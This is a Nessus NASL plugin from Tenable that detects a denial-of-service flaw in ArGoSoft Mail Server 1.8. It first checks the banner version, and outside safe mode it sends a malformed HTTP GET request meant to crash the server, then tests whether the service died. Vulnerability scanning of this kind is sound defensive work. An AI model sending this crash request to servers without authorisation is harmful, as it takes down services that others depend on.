#
# (C) Tenable Network Security
#
# From: "Rushjo@tripbit.org" <rushjo@tripbit.org>
# To: bugtraq@security-focus.com
# Subject: Denial of Service Attack against ArGoSoft Mail Server Version 1.8 
# 



if(description)
{
  script_id(11734);
  script_bugtraq_id(7873);
  
  script_version ("$Revision: 1.5 $");
  name["english"] = "Argosoft DoS";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote mail server suffers from a denial of service vulnerability. 

Description :

It is possible to kill the remote HTTP server by sending an invalid
request to it.  An unauthenticated attacker may leverage this issue
to crash the affected server. 

See also :

http://www.securityfocus.com/archive/1/324750

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";

  script_description(english:desc["english"]);
 
  summary["english"] = "Bad HTTP request";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2003-2006 Tenable Network Security");
  family["english"] = "Denial of Service";
  script_family(english:family["english"]);
  script_require_ports("Services/www", 80);
  script_dependencie("http_version.nasl");
  exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if ( "ArGoSoft" >!< banner ) exit(0);

if( safe_checks() )
{
 if(egrep(pattern:"^Server: ArGoSoft Mail Server.*.1\.([0-7]\..*|8\.([0-2]\.|3\.[0-5]))", string:banner))
 	{
	security_note(port);
	}
 exit(0);	
}

if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

send(socket:soc, data:'GET  /index.html\n\n');
r = recv_line(socket:soc, length:2048);
close(soc);

if (http_is_dead(port: port)) {  security_note(port); exit(0); }
